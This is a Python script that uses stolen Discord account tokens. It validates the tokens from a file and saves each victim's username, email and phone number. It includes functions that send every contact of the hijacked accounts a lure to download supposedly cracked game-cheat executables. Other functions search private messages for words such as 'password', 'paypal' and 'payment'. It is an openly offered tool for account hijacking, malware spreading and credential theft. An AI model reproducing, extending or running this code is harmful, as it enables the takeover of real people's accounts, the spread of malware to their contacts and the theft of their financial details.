import os
import random
import time
import requests
import json

channels = {"general": 765669565874176010}
accounts = {}


def set_typing(token):
    url = f"https://discord.com/api/v8/channels/765669565874176010/typing"
    headers = {"authorization": token,
               "accept": "/",
               "authority": "discordapp.com",
               "content-length": "0"
               }
    r = requests.post(url, headers=headers, json={})
    print(f"Sent typing request: {r.status_code}")


def send_message(msg, channel_id, token):
    url = f"https://discord.com/api/v8/channels/{channel_id}/messages"
    headers = {"authorization": token,
               "accept": "/",
               "authority": "discordapp.com",
               "content-type": "application/json",
               }
    data = {"content": msg}
    r = requests.post(url, headers=headers, json=data)
    if r.status_code == 200:
        print(f"Sent message.")
    else:
        print(f"Error on send message: {r.status_code}\n")


def get_profile(id, token):
    url = f"https://discord.com/api/v8/users/{id}/profile"
    headers = {"authorization": token,
               "accept": "/",
               "authority": "discordapp.com",
               "content-type": "application/json",
               }
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        print(f"Account name: {r.json()['user']['username']}")
        return True
    else:
        print(f"Token, {token} Invalid. {r.status_code}")
        return False


def validate_token(token):
    global accounts
    url = f"https://discord.com/api/v8/users/@me"
    headers = {"authorization": token,
               "accept": "/",
               "authority": "discordapp.com",
               "content-type": "application/json",
               }
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        data = r.json()
        accounts[token] = {'username': data['username'] + data['discriminator'], 'id': data['id'],
                           'email': data['email'], 'phone': data['phone']}
        print(f"{accounts[token]['username']} | Valid {token}")
        return True
    else:
        print(f"Invalid {token} {r.status_code}")
        return False


def get_channels(token):
    url = f"https://discordapp.com/api/users/@me/channels"
    headers = {"authorization": token,
               "accept": "/",
               "authority": "discordapp.com",
               "content-type": "application/json",
               }
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        return r.json()
    else:
        print(f"Get channels error: {r.status_code}")
        return False


def find_messages(token, terms):
    for index, channel in enumerate(get_channels(token)):
        url = f"https://discord.com/api/v8/channels/{channel['id']}/messages?limit=100"
        headers = {"authorization": token,
                   "accept": "/",
                   "authority": "discordapp.com",
                   "content-type": "application/json",
                   }
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            for msg in r.json():
                if any(word in msg['content'].lower() for word in terms):
                    print(f"({msg['author']['username']+'#'+msg['author']['discriminator']}) ({msg['channel_id']}) Found term.\nMSG: {msg['content']}\n")
        else:
            print(f"Get channels error: {r.status_code}")
            return False


def get_ip():
    session = requests.Session()
    r = session.get('https://ifconfig.co/json')
    data = f'IP: {r.json()["ip"]} - Country: {r.json()["country"]}, {r.json()["city"]}'
    return data


def send_mass_dms(token):
    msgs = ['if your looking for a r6 cheat Mango Cheats just got cracked https://cdn.discordapp.com/attachments/755205918081286277/771125589973008414/mango_cheats_cracked_2.9.exe',
            'if your looking for a r6 cheat Alnexcheats just got cracked https://cdn.discordapp.com/attachments/755205918081286277/771125777239900200/Alnexcheats_cheats_cracked-4.2.exe']
    for index, channel in enumerate(get_channels(token)):
        send_message(random.choice(msgs),
                     channel['id'],
                     token)
        print(f"To {channel['recipients'][0]['username']} #{index}\n")
        time.sleep(1.5)


def validate_all():
    global accounts
    for account in dict(accounts):
        if not validate_token(account):
            accounts.pop(account, None)

    if os.path.getsize("tokens.txt") > 0:
        with open("tokens.txt", "r+") as file:
            lines = file.readlines()
            file.seek(0)

            for line in lines:
                if len(line) <= 1:
                    continue

                if line.strip() in list(accounts.keys()):
                    continue

                if validate_token(line.strip()):
                    file.write(line)
            file.truncate()

        with open('accounts.json', 'w') as file:
            json.dump(accounts, file, indent=4)


if __name__ == '__main__':
    with open('accounts.json') as file:
        accounts = json.load(file)
    validate_all()

    # for token in list(accounts.keys()):
    #     send_mass_dms(token)
    # for token in list(accounts.keys()):
    #     terms = ['price', 'buy', 'password', 'pass', 'login', 'paypal', 'cost', 'email', 'gift', 'nitro', 'payment', 'money', 'code', 'download', 'link', 'usd']
    #     print(f"Searching messages in {accounts[token]['username']} with terms: {terms}")
    #     find_messages(token, terms)
